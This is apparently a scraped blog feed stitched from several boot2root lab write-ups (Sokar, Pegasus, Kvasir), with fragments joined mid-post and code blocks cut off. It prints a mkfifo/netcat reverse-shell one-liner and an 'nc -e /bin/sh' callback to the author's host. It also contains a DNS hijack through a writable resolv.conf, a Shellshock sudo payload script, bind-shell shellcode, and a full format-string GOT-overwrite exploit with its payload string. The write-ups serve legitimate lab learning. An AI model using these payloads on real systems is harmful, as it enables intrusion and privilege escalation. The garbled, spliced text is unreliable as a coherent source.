<p>All of this information was great to have, but it still had one major problem. How can I clone a repository <strong>I</strong> own? I made <em>countless</em> attempts to try fool the environment into resolving <code>sokar-dev</code> to my Kali Host. Every single one failed. All of the material on the topic that I found online suggest that the SUID process &lsquo;cleans up&rsquo; the environment, especially for reasons such as this one.</p>

<p>I started doubting my plan and was nearing a point of leaving Sokar for a bit to rethink my strategy when I realized the following gem:</p>

<p>```bash
leonjza@kali/sokar $ python apophis.py &ldquo;find /etc/ -writable -type f 2>/dev/null | xargs ls -lh&rdquo;
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(2); print &lsquo;overdrive&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;, &lsquo;-l&rsquo;, &lsquo;-c&rsquo;,&lsquo;find /etc/ -writable -type f 2>/dev/null | xargs ls -lh&rsquo;, &lsquo;apophis&rsquo;]);&rdquo;</p>

<p>Password:
-rw-rw-rw- 1 root root 19 Jan  2 20:12 /etc/resolv.conf
```</p>

<p><code>/etc/resolv.conf</code> is <strong>world writable</strong>. This is perfect! I can change the DNS server to use to one that I control, obviously feeding it a IP that will be my local Kali instance :D</p>

<h3>preparing the environment and exploit</h3>

<p>I decided to use <code>dnsmasq</code> for a quick to setup DNS server. I added a line to <code>/etc/dnsmasq.hosts</code> to answer a query for <code>sokar-dev</code>:</p>

<p><code>bash
leonjza@kali/sokar $ cat /etc/dnsmasq.hosts
192.168.217.174 sokar-dev
</code></p>

<p>&hellip; and started the <code>dnsmasq</code> server:</p>

<p>```bash
leonjza@kali/sokar $ dnsmasq &mdash;no-daemon &mdash;log-queries -H /etc/dnsmasq.hosts</p>

<p>dnsmasq: started, version 2.62 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus i18n IDN DHCP DHCPv6 no-Lua TFTP conntrack
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 192.168.252.2#53
dnsmasq: read /etc/hosts &ndash; 6 addresses
dnsmasq: read /etc/dnsmasq.hosts &ndash; 1 addresses
```</p>

<p>Testing my DNS server proved that it was working just fine:</p>

<p>```bash
leonjza@kali/sokar $ dig sokar-dev @127.0.0.1</p>

<p>; &lt;&lt;>> DiG 9.8.4-rpz2+rl005.12-P1 &lt;&lt;>> sokar-dev @127.0.0.1

<p>Awesome. The next step was to replace the contents of Sokar&rsquo;s <code>/etc/resolv.conf</code> so that the dns server to use is <em>192.168.217.174</em> with the command <code>python apophis.py "echo \"nameserver\ 192.168.217.174\" &gt; /etc/resolv.conf"</code> and confirm that it worked:</p>

<p>```bash
leonjza@kali/sokar $ python apophis.py &ldquo;cat /etc/resolv.conf&rdquo;
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(2); print &lsquo;overdrive&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;, &lsquo;-l&rsquo;, &lsquo;-c&rsquo;,&lsquo;cat /etc/resolv.conf&rsquo;, &lsquo;apophis&rsquo;]);&rdquo;</p>

<p>Password:
nameserver 192.168.217.174
```</p>

<p>Great. Testing time!</p>

<p>```bash
leonjza@kali/sokar $ python apophis.py &ldquo;echo Y | /home/apophis/build&rdquo;
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(2); print &lsquo;overdrive&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;, &lsquo;-l&rsquo;, &lsquo;-c&rsquo;,&lsquo;echo Y | /home/apophis/build&rsquo;, &lsquo;apophis&rsquo;]);&rdquo;</p>

```</p>

<p>Yesssssss, and nooooooooo. From the <code>dnsmasq</code> console output I could see the request for <code>sokar-dev</code> coming in and a reply getting sent:</p>

<p><code>bash
dnsmasq: query[A] sokar-dev from 192.168.217.163
dnsmasq: /etc/dnsmasq.hosts sokar-dev is 192.168.217.174
</code></p>

<p>However, in order for the SSH session to happen, I need to either accept or bypass the host key verification. There are many ways to do this, but sadly, with my current (still! :D) nonexistent interactive shell, I can not type &lsquo;yes&rsquo;. I can not use <code>ssh-keyscan &gt;&gt; ~/.ssh/known_hosts</code> as I can&rsquo;t write to <code>root</code>&rsquo;s <code>.ssh</code> directory, nor can I modify the command that is being passed onto <code>system()</code> in the binary to specify <code>-o StrictHostKeyChecking=no</code>.</p>

<p>Unfortunately, due to these restrictions, I had to finally give in and go one step back to <code>bynarr.py</code> and use his allowed egress access on <code>tcp/51242</code> to build a interactive shell. On one session I started a netcat listener, and on another, I ran <code>python bynarr.py "/bin/rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.217.174 51242 &gt;/tmp/f"</code>.</p>

<p>```bash
leonjza@kali/sokar $ nc -lvp 51242
listening on [any] 51242 &hellip;
192.168.217.163: inverse host lookup failed: Unknown server error : Connection timed out

<p>[apophis@sokar ~]$ id
id
uid=501(apophis) gid=502(apophis) groups=502(apophis)
[apophis@sokar ~]$
```</p>

<p>With the interactive shell as <code>apophis</code> now, I was able to accept the SSH hostkey check.</p>

<p>The next thing left on the list was to prepare a <code>git</code> repository that can actually be cloned. Setting one up is reaaaaally simple. Because I knew that it will be looking for <code>/root/secret-project</code>, I prepared just that on my Kali VM:</p>

<p><code>bash
leonjza@kali/sokar $ cd /root
leonjza@kali/root $ mkdir secret-project
leonjza@kali/root $ cd secret-project
leonjza@kali/root/secret-project $ git init --bare
Initialized empty Git repository in /root/secret-project/
leonjza@kali/root/secret-project | git:master $
</code></p>

<p>Thats it&hellip; Next, I cloned it locally in a different folder.</p>

<p><code>bash
leonjza@kali/sokar $ git clone ssh://127.0.0.1/root/secret-project
Cloning into 'secret-project'...
root@127.0.0.1's password:
warning: You appear to have cloned an empty repository.
leonjza@kali/sokar $ cd secret-project
leonjza@kali/sokar/secret-project | git:master $
</code></p>

<p>Done. Working from a PoC exploit found <a href="https://gitlab.com/mehmet/cve-2014-9390">here</a>, I continued to prepare a similar exploit, except for the fact that I changed the actual hook to connect to my Mac (hosting the VM&rsquo;s) on a <code>tcp/22</code> netcat listener, spawning a shell. I knew <code>tcp/22</code> traffic was allowed due to the SSH host key verification step that needed some work :)</p>

<p>```bash

<h2>edit</h2>

<p>I have been wondering if it was possible to get complete remote root command execution using the sample python scripts used for apophis and bynarr. Well, turns out the <code>lime</code> script run with <code>sudo</code> can be shocked too!</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<p>import requests

sys.exit(1)
</code></pre>

<h1>Grab the command from the args</h1>

<p>command = sys.argv[1].strip()</p>

<h1>prep to shock the lime script</h1>

<p>root_command = &ldquo;&rdquo;&ldquo;echo "N&rdquo; | sudo MAIL=\&ldquo;() { :;}; %s;\&rdquo; /home/bynarr/lime"&ldquo;&rdquo; % command</p>

    <content type="html"><![CDATA[<h2>introduction</h2>

<p><a href="https://www.vulnhub.com/entry/pegasus-1,109/">Pegasus 1</a> is a boot2root hosted on <a href="https://www.vulnhub.com/">VulnHub</a> built by <a href="https://twitter.com/theknapsy">@TheKnapsy</a>. He wrote a <a href="http://knapsy.github.io/blog/2014/12/16/pegasus-has-arrived-my-first-boot2root-vm/">blogpost</a> about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).</p>

<p><img class="right <a" src="href="https://i.imgur.com/PI4O7Dp.png">https://i.imgur.com/PI4O7Dp.png</a>"> Having recently played in the <a href="https://leonjza.github.io/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/">Offsec Playground</a> a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson&hellip; <em>again</em>. You will see this in the <strong>my_first</strong> section.</p>

<p>Like many other write ups I do, I will also recommend you try this one first before you read on. For me, Pegasus was definitely slightly more difficult than the usual VulnHub stuff you would see, but part of that may just as well be due to fatigue and that year end holiday mode ;p. However, that should not discourage you to give it a bash anyways!</p>

<p>Lets begin.</p>

<h2>nmap, again</h2>

<p>Starting a VM like this, you should almost have a knee-jerk reaction to reach for nmap as your first tool to use. A VM, hosted on the network, means you will probably be attacking this one&hellip; via the network. So after figuring out what the IP address is (via arp, netdiscover etc.), I threw nmap at it:</p>

<p>```bash
root@kali:~# nmap &mdash;reason -sV 192.168.56.101 -p-</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-12-23 09:16 SAST

```</p>

<p><code>tcp/22</code>, <code>tcp/111</code>, <code>tcp/8088</code> and <code>tcp/55625</code>. Thats quite a bit to work with already. I decided to dive right into the web server that appears to be running on <code>tcp/8088</code>.</p>

<h2>stomping some hoofs with pegasus</h2>

<p>Browsing to <a href="http://192.168.56.101:8088/,">http://192.168.56.101:8088/,</a> we are presented with a picture of Pegasus:</p>

<p><img class="<a" src="href="https://i.imgur.com/Z0XYRY8.jpg">https://i.imgur.com/Z0XYRY8.jpg</a>"></p>

<p>I manually tried to browse to things like <code>robots.txt</code> etc, but everything responded with the same image. This was until I decided to browse to <code>index.php</code>, in an attempt to check that the web server is configured to serve PHP content:</p>

<p><img class="<a" src="href="https://i.imgur.com/svwUN3m.png">https://i.imgur.com/svwUN3m.png</a>"></p>

<p>So this doesn’t exactly tell us PHP is supported yet, but it does get us somewhere if we wanted to brute force the web server in search of content. Inspecting the headers of the HTTP responses thus far, we would see that everything would return HTTP 200, however, <code>.php</code> scripts would 404 correctly. With that in mind, it was time to reach for <code>wfuzz</code> to discover some more.</p>

<p>```bash
root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt  &mdash;hc 404 <a href="http://192.168.56.101:8088/FUZZ.php">http://192.168.56.101:8088/FUZZ.php</a></p>

</ul>

<p>Target: <a href="http://192.168.56.101:8088/FUZZ.php">http://192.168.56.101:8088/FUZZ.php</a>
Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt</p>

<h1>Total requests: 1660</h1>

<h1>ID  Response   Lines      Word         Chars          Request    </h1>

<p>01426:  C=200      0 L         4 W       19 Ch    &ldquo; &ndash; submit&rdquo;
```</p>

<p>And we have a HTTP 200 response for <code>submit.php</code>. So, I browsed to <a href="http://192.168.56.101:8088/submit.php:">http://192.168.56.101:8088/submit.php:</a></p>

<p><img class="<a" src="href="https://i.imgur.com/Ld1KzkR.png">https://i.imgur.com/Ld1KzkR.png</a>"></p>

<p>Well that isn&rsquo;t exactly useful. I played a little with the <code>submit.php</code> by sending a POST with some <code>--data</code>, but nothing useful came of it. Almost everything came back with <code>No data to process</code>.</p>

<p>Admittedly, this was my first hurdle. I was thinking if there is a <code>submit.php</code>, surely there is something that actually submits the appropriate data to it? So I pulled out some more wordlists and fed them to wfuzz to work on. I&rsquo;ll be honest, I did not like this part much. The wordlists were just too big and it almost felt like this is probably not the way to go about this. <code>wfuzz</code> was working with <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>, when finally I get a HTTP 200 for <code>codereview.php</code>.</p>

<p><img class="<a" src="href="https://i.imgur.com/wYpHVWE.png">https://i.imgur.com/wYpHVWE.png</a>"></p>

<h2>pwning mike</h2>

<p>So mike is apparently a trainee code reviewer. We have a form where we can submit code for him to check out. This is the form that submits the POST data <code>code</code> to the previously found <code>submit.php</code>.</p>

<p>Ok. Well this is a interesting one. My initial thoughts were that if Mike was checking out code, he is possibly executing it? There was however no hint on what language he is expecting, so the wild goose chase began.</p>

<p>PHP, Python, Perl, Ruby, Bash. Name them. I tried them all. Ok maybe not all, especially not brainfk. :D However, in all of them, I tried to get the language to execute <code>/bin/nc 192.168.56.102 4444 -e /bin/sh</code> or variants thereof so that it would connect to my netcat listener on my Kali machine, and spawn me a shell.</p>

<p>Eventually, I came to try some C. Admittedly, I was starting to rethink my strategy by now. That was until my C source had a call to <code>system()</code> in it:</p>

<p><img class="<a" src="href="https://i.imgur.com/IVmBaAA.png">https://i.imgur.com/IVmBaAA.png</a>"></p>

<p>Ooooooh. Ok so that was a very obvious hint that I was getting closer. For me, this boiled down to it either accepting PHP due to <a href="http://php.net/manual/en/function.system.php">system</a>, or C due to its <a href="http://linux.die.net/man/3/system">system</a>. Obviously though, <code>system()</code> is being filtered out, so I would need an alternative.</p>

<p><em>insert fade to black</em></p>

<p><em>CAPTION: many hours later</em></p>

<p>After exhausting my PHP attempts, it was time to move to C. My first attempt was was something along the lines of</p>

<p>```c</p>

<h1>include&lt;stdio.h></h1>

<p>// msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c
unsigned char buf[] =
&ldquo;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80&rdquo;
&ldquo;\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a&rdquo;
&ldquo;\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0&rdquo;
&ldquo;\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f&rdquo;
&ldquo;\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0&rdquo;
&ldquo;\x0b\xcd\x80&rdquo;;</p>

<p>int main()
{</p>

<pre><code>int (*ret)() = (int(*)())buf;
ret();
</code></pre>

<p>}
```</p>

<p>This was supposed to open me a <code>tcp/4444</code> shell, but to no avail. Infact, no shellcode related execution appeared to do anything. As a last resort before I figured I&rsquo;d need to get me some hints, I searched for some non-shellcode type bind shell generation C source. Unfortunately, I don’t write C socket software out of my head, but luckily Google came to the rescue and landed me on <a href="http://bigpointyteeth.se/code/bindshell.c">this</a>. I modified the code slightly by hardcoding my desired port and shell, and submitted it to be &lsquo;reviewed&rsquo;:</p>

<p>}
```</p>

<p>All of my attempts were followed by a nmap on <code>tcp/4444</code> to see if the shell has become available. After submitting the above code, we got a new port open (this Mike guy is pretty fast you should hire him!):</p>

<p>```bash
root@kali:~# nmap 192.168.56.101 -p 4444</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-12-23 11:33 SAST

<p>Awesome, so lets connect and see what we have:</p>

<p>As was hoped for, a shell as <code>mike</code>. I quickly generated a new ssh key pair for Pegasus, and cat the public key to <code>mike</code>&rsquo;s <code>authorized_keys</code> file and went on to SSH in as mike:</p>

<p>```bash</p>

<h2>my_first, your_first, we_all_first</h2>

<p>With my initial shell I was able to start enumerating Pegasus a little more. The most obvious next step was the SUID binary in <code>mike</code>&rsquo;s home (we will get to it shortly):</p>

<p><code>bash
mike@pegasus:~$ ls -lh
total 16K
-rwxr-xr-x 1 mike mike  845 Nov 18 20:52 check_code.sh
drwx------ 2 mike mike 4.0K Nov 18 17:49 Mail
-rwsr-xr-x 1 john john 6.5K Nov 28 10:26 my_first
</code></p>

<p>More enumeration revealed that <code>/opt/</code> had a number of interesting parts to it as well:</p>

<p><code>bash
mike@pegasus:~$ ls -lh /opt/
total 12K
drwxrwxrwx 2 root root 4.0K Dec 23 20:33 code_review
drwxr-xr-x 3 root root 4.0K Nov 25 04:38 git
drwxr-xr-x 2 root root 4.0K Nov 18 14:43 nfs
</code></p>

<p>Piecing the web interface together, you will see that the submitted source is put into <code>code.c</code> in <code>/opt/code_review/</code>, and then compiled from the script in <code>/home/mike/check_code.sh</code> and eventually executed.</p>

<p>The <code>/opt/git/</code> folder had what looked like remnants of the typical <code>.git/</code> folders when you checkout code from a repo, but not the actual files itself. I poked around a bit, and was able to re-assemble the <code>main.c</code> file from the git history.</p>

<h3>rebuilding main.c</h3>

<p><em>This step is not essential in progressing with Pegasus, but I figured it would be an interesting approach nonetheless</em></p>

<p>Even though the git folder did not appear to have any actual source files, one could quickly learn what it contains. For example, the git log will show you the commit history:</p>

<p>```bash
mike@pegasus:/opt/git/my_first.git$ git log
commit 85365946a8142c52ee6040a029dd069b514c2ab0
Author: Mike Ross &lt;mike@pegasus.(none)>

<pre><code>Committing some security fixes

<p>commit 0a8af1ed956518ec078b152ad7571105e2df26c6

Date:   Tue Nov 25 04:39:42 2014 +1100</p>

<pre><code>initial commit
</code></pre>

<p>```</p>

<p>From the log we can see that there as an initial commit, and one more after that with some <em>security fixes</em>. Chances are, if we can see what the initial commit was then we can see the full initial code. So, lets check out the details of commit <em>0a8af1ed</em>:</p>

<p>```diff
mike@pegasus:/opt/git/my_first.git$ git show 0a8af1ed

<p>[&hellip; snip &hellip;]
```</p>

<p>Nice! We have a file <code>main.c</code> that was added. I copied the diff and saved it to <code>init.patch</code>, and then ran the patch:</p>

<p><code>bash
root@kali:~# patch -p1 &lt; init.diff
patching file main.c
</code></p>

<p>That gives us the state of files after commit <em>0a8af1ed</em> which was labeled as the initial commit. The same process was followed for the next commit <em>85365946a8</em> which apparently included some <em>security fixes</em>. Copy the diff, make the .patch file and apply it. After this process, we have the sources up to where the git commit history has it.</p>

<p>I inspected that code before and after the security fixes commit, and noticed that the security fixes fixed a potential format string vulnerability. At least, that was the one my untrained eye was able to spot:</p>

<p>```diff

<ul>

     int numB = strtol(numberB, &amp;err_check, 10);

         printf("\n");
         return 1;
</code></pre>

<p>[&hellip; snip &hellip;]
```</p></li>
</ul>


<p><code>printf(err_check);</code> is the potentially vulnerable call&hellip; I think.</p>

<h3>the calculator with a hole</h3>

<p>After toying with the git repository, my attention turned back to the SUID binary. When I run <code>my_first</code>, I am actually running it as <code>john</code>. This means, should I be able to exploit it and do things other than what its intended for, I may affectively gain <code>john</code>&rsquo;s privileges! Sounds easy right. :P</p>

<p>I quickly realized that the <code>main.c</code> file I got out of the git repository, was the sources for the <code>my_first</code> binary. So, my focus shifted to the piece of code I saw the security fix for.</p>

<p>First, it was time to confirm my suspicion of a format string vulnerability:</p>

<p>```bash
mike@pegasus:~$ ./my_first</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Selection:
```</p>

<p><img class="<a" src="href="https://i.imgur.com/xrrpxFZ.png">https://i.imgur.com/xrrpxFZ.png</a>"></p>

<p>I don’t like format string vulnerabilities. In fact not at all. I was hoping for something else and at this stage, I was happy I found the bug (which was the code before the security fixes btw), but sad that its a format string.</p>

<p>Anyways, feels aside, it was time to work on a exploit.</p>

<p>For the format string exploit, I don&rsquo;t think its really worth explaining all the details again. In fact, compiling this exploit, I was referring to a older blogpost about <a href="https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/">Xerxes2</a> which also had a similar thing going. Feel free to check the binary section out there if the next part does not make much sense.</p>

<p><strong>EDIT</strong> I have since made a small asciinema showing the offset calculations on my Kali VM. Though the offsets are not the same the theory still applies. </p>

<h3>punching more than numbers</h3>

<p><em>So here, I had a pretty big freaking fail. A massive one. Once I had determined the stack position to start corrupting memory with, I was punching in the format strings in the application itself. Meaning, I was giving it the ASCII \x\x\x\x and not the actual bytes as would have been the case if I was using python/printf to redirect the stdout of them to <code>my_first</code>&rsquo;s stdin. Anyways, lessons were learnt, caffeine was injected. It wont happen again. Big up to <a href="https://twitter.com/barrebas">@barrebas</a> for subtly pointing the fail out ;p</em></p>

<p>As I had seen the source code, it was easy to formulate a plan for the exploit. I would make use of a ret2libc attack by overriding the GOT entry for <code>printf()</code> using the format string to <code>system()</code> instead. This means, the next time <code>printf()</code> is called, it would actually execute <code>system()</code> with the adjacent argument on the stack. Lets see how this was done.</p>

<h4>compiling the format string</h4>

<p>We know that the 2nd number that the applications wants triggers our format string. So, lets prepare some skeleton input, piping it to the <code>./my_first</code> binary to sample a successful run:</p>

<p>```bash
mike@pegasus:~$ printf &lsquo;1\n1\n1\n4\n&rsquo; | ./my_first</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit</p>

<p>Selection:
Enter first number: Enter second number: Result: 1 + 1 = 2</p>

<p>Selection:
Goodbye!
```</p>

<p>Cool, so we have sampled adding 1 to 1 ;p Now we can get to exploiting the format string. The first step we have is to determine which parameter on the stack we have control of. We determine this by providing it with a string of 4 A&rsquo;s, and then incrementing the format string arguments by 1 until we can find the 4 A&rsquo;s. In my case, I will be formatting them as hex with <code>%x</code>, so I am searching for <code>41414141</code>. The format string will therefore start as <code>AAAA.0x%s</code>. Note that in the below example we are using 2 x percentages (2 x &lsquo;%&rsquo;) as it needs to be escaped in the shell:</p>

<p>```bash
mike@pegasus:~$ printf &lsquo;1\n1\nAAAA.0x%%x\n4\n&rsquo; | ./my_first</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit</p>

<p>Selection:
Enter first number: Enter second number: Error details: AAAA.0xbff5321c</p>

<p>Selection:
Goodbye!
```</p>

<p>And we have the output of <code>AAAA.0xbff5321c</code>. Yay :)
Continuously incrementing this will eventually get you to argument 8, where you will find the clean string of hex A&rsquo;s:</p>

<p>```bash
mike@pegasus:~$ printf &lsquo;1\n1\nAAAA.0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x\n4\n&rsquo; | ./my_first</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit</p>

<p>Selection:
Enter first number: Enter second number: Error details: AAAA.0xbfbd145c0xa0xb75b41600xb7726ac00xb7752ff40xb77539180xbfbd14600x41414141</p>

<p>Selection:
Goodbye!
mike@pegasus:~$
```</p>

<p>So, using direct parameter access in the format string, we can reference parameter 8 directly:</p>

<p>```bash
mike@pegasus:~$ printf &lsquo;1\n1\nAAAA.0x%%8$x\n4\n&rsquo; | ./my_first</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit</p>

<p>Selection:
Enter first number: Enter second number: Error details: AAAA.0x41414141</p>

<p>Selection:
Goodbye!
mike@pegasus:~$
```</p>

<p>Parameter 8 in the format string is the start of the section on the stack we can read now, shown in the output <code>AAAA.0x41414141</code> of the format string <code>AAAA.0x%8$x</code>.</p>

<p>Now we will move on to making use of the <code>%n</code> format string to write to a arbitrary area in memory. Where do we want to write? To the GOT where the lookup for <code>printf()</code> occurs ofc! Lets dump the GOT for <code>./my_first</code>, and determine where it will go look for <code>printf()</code>:</p>

<p>```bash
mike@pegasus:~$ objdump -R ./my_first</p>

<p>./my_first:     file format elf32-i386</p>

<p>DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049bec R_386_GLOB_DAT    <strong>gmon_start</strong>
08049c20 R_386_COPY        stdin
08049bfc R_386_JUMP_SLOT   printf
08049c00 R_386_JUMP_SLOT   fgets
08049c04 R_386_JUMP_SLOT   puts
08049c08 R_386_JUMP_SLOT   <strong>gmon_start</strong>
08049c0c R_386_JUMP_SLOT   __libc_start_main
08049c10 R_386_JUMP_SLOT   putchar
08049c14 R_386_JUMP_SLOT   strtol
```</p>

<p>The location of <code>printf()</code> will be looked up at <code>08049bfc</code>. This is the part where we want to rewrite the address of <code>printf()</code> to that of libc&rsquo;s <code>system()</code>.</p>

<p>The last part we need is to know where <code>system()</code> actually is. An important vector that may influence this position in memory is known as ASLR, which will effectively cause the address of <code>system()</code> to be different every time <code>./my_first</code> is run. To combat this, a neat little trick to increase the stack size can be used using <code>ulimit</code>. <code>ulimit -s unlimited</code> will maximize the stack size, effectively causing the ASLR to be practically nonexistent:</p>

<p><code>bash
mike@pegasus:~$ ulimit -s
8192
mike@pegasus:~$ ulimit -s unlimited
mike@pegasus:~$ ulimit -s
unlimited
</code></p>

<p>With the ASLR problem out of the way, lets leak the address of <code>system()</code>:</p>

<p>```bash</p>

<h1>fire up gdb</h1>

<p>mike@pegasus:~$ gdb -q ./my_first
Reading symbols from /home/mike/my_first&hellip;(no debugging symbols found)&hellip;done.</p>

<h1>set a break point as we enter main()</h1>

<p>(gdb) b main
Breakpoint 1 at 0x804850f</p>

<h1>run the binary</h1>

<p>(gdb) r
Starting program: /home/mike/my_first</p>

<p>Breakpoint 1, 0x0804850f in main ()</p>

<h1>leak the current address of system()</h1>

<p>(gdb) p system
$1 = {<text variable, no debug info>} 0x40069060 <system>
(gdb)
```</p>

<p>And so we learn that <code>system()</code> lives at <code>0x40069060</code>. What does this all mean so far then? Well, we are now going to use the format string vulnerability to write (using <code>%n</code>) a new address for <code>printf()</code> in the GOT at <code>08049bfc</code> to point to <code>system()</code> at <code>0x40069060</code> instead of its real location.</p>

<p>For us to debug the application while we prepare the required padding for the format string, we will use the <code>printf()</code> used to pipe to <code>./my_first</code> to redirect to a file instead. Then, in <code>gdb</code>, we will run the binary, redirecting the input from the file we will compile with the <code>printf()</code>:</p>

<p>```bash</p>

<h1>so, instead of the 4 x A&rsquo;s, we will now place the address</h1>

<h1>in the GOT that we want to override, and use the %x format</h1>

<h1>string to attempt writing to it</h1>

<p>mike@pegasus:~$ printf &lsquo;1\n1\n\xfc\x9b\x04\x08%%8$n&rsquo; > t
mike@pegasus:~$ file t
t: data</p>

<h1>then, in gdb, we will grab the output of the new file called</h1>

<h1>t, and redirect it as input to my_first</h1>

<p>mike@pegasus:~$ gdb -q ./my_first
Reading symbols from /home/mike/my_first&hellip;(no debugging symbols found)&hellip;done.</p>

<h1>leak the current address that GOT points to for printf()</h1>

<p>(gdb) x/x 0x08049bfc

<h1>run the binary with our exploit (t) as input</h1>

<p>(gdb) r &lt; t
Starting program: /home/mike/my_first &lt; t</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Select your tool:

[4] Exit</p>

<p>Selection:

<p>Program received signal SIGSEGV, Segmentation fault.

<h1>inspect the new address the GOT points to for printf()</h1>

<p>(gdb) x/x 0x08049bfc

(gdb)
```</p>

<p>This is working exactly as expected. Now all that is left is to pad the format string so that we can have the address <code>0x40069060</code> instead of <code>0x00000004</code> written. For the math etc involved, refer to the Xerxes2 post I previously mentioned. The resultant format string was <code>\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n</code>, with a run in the debugger ending in:</p>

<p>```bash</p>

<h1>prep the input file</h1>

<p>mike@pegasus:~$ printf &lsquo;1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n&rsquo; > t
mike@pegasus:~$</p>

<h1>run it in the debugger</h1>

<p>(gdb) p system

```</p>

<p>The binary crashes with <code>sh: 1: Selection:: not found</code>, meaning that it is now trying to run <code>system("Selection:")</code> instead of <code>printf("Selection:")</code> due to the GOT override.</p>

<h4>finishing the exploit</h4>

<p>From here the exploit is pretty easy. We can use some $PATH trickery in our current shell to get <code>Selection:</code> to actually mean something, like prepare a small SUID C shell perhaps? :)</p>

<p>I quickly compiled some C wrapper code to prepare a shell and ran the exploit.</p>

<p>```bash</p>

<h1>Prep Selection: to make a SUID shell for john</h1>

<p>mike@pegasus:~$ cat tojohn.c</p>

<h2>hoofing (rooting) Pegasus</h2>

<p>I added the public key of the keypair I generated for Pegasus to <code>john</code>&rsquo;s authorized_keys file and proceeded to SSH in as him.</p>

<p>Quick enumeration showed that <code>mike</code> is allowed to start the nfs daemon via <code>sudo</code>:</p>

<p>```bash
john@pegasus:~$ sudo -l

<pre><code>env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

```</p>

<p>I checked out the <code>/etc/exports</code> file, and noticed the the <code>no_root_squash</code> flag for the <code>/opt/nfs</code> export. This is most certainly the way to root Pegasus as nfs will not go and nobody my files :)</p>

<p>So, I mounted the share&hellip;</p>

<p><code>bash

    <content type="html"><![CDATA[<h2>introduction</h2>

<p><a href="http://vulnhub.com/entry/kvasir-i,106/">Kvasir</a>, a boot2root by <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> has to be one of my most favorite boot2roots to date, if not the most favorite. Favorite however does not mean it was easy. It also proved to be one of the most challenging ones I have had the chance to try!</p>

<p><img class="right <a" src="href="https://i.imgur.com/gHw2Q50.gif">https://i.imgur.com/gHw2Q50.gif</a>"> Kvasir is <em>extremely</em> well polished, and it can be seen throughout the VM that <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> has gone through a lot of effort to make every challenge as rewarding as possible. From exploiting simple web based vulnerabilities to service misconfigurations, traffic sniffing, steganography, forensics and cryptopraphy, Kvasir has it all! Solving it also had me make really heavy use of good old netcat.</p>

<p>This writeup details the path I took to read the final flag :)</p>

<h2>a usual start</h2>

<p>Before we start off though, I feel its important to touch base on tunneling techniques used. All of the tunneling was done either via netcat, or via a SSH socks proxy. The socks proxies were accessed using <code>proxychains</code>, and I was editing <code>/etc/proxychains.conf</code> to match the port of the proxy I needed to use to reach my desired destination.</p>

<p>With that out the way, lets start.<br/>
Almost all of the boot2roots have a discovery phase. After downloading the archive from <a href="http://vulnhub.com">vulnhub.com</a>, I ran a ping scan in the subnet that my host-only network lives in. It returned with no results, and I realized there may already be more to this than anticipated. I engaged <em>lazy mode</em>™ and checked what the VirtualBox session showed the IP was:</p>

<p><img class="<a" src="href="https://i.imgur.com/ZTj0D3h.png">https://i.imgur.com/ZTj0D3h.png</a>"></p>

<p><strong>192.168.56.102</strong>. Sweet, throwing <code>nmap</code> at it showed only <code>tcp/80</code> as open.</p>

<p>```bash
root@kali:~# nmap 192.168.56.102</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-11-09 11:07 SAST

MAC Address: 08:00:27:CF:5D:57 (Cadmus Computer Systems)</p>

```</p>

<h2>fink ur gud enuf?</h2>

<p>Browsing to the IP using Iceweasel, we see a login portal presented to us:</p>

<p><img class="<a" src="href="https://i.imgur.com/vUSSRt7.png">https://i.imgur.com/vUSSRt7.png</a>"></p>

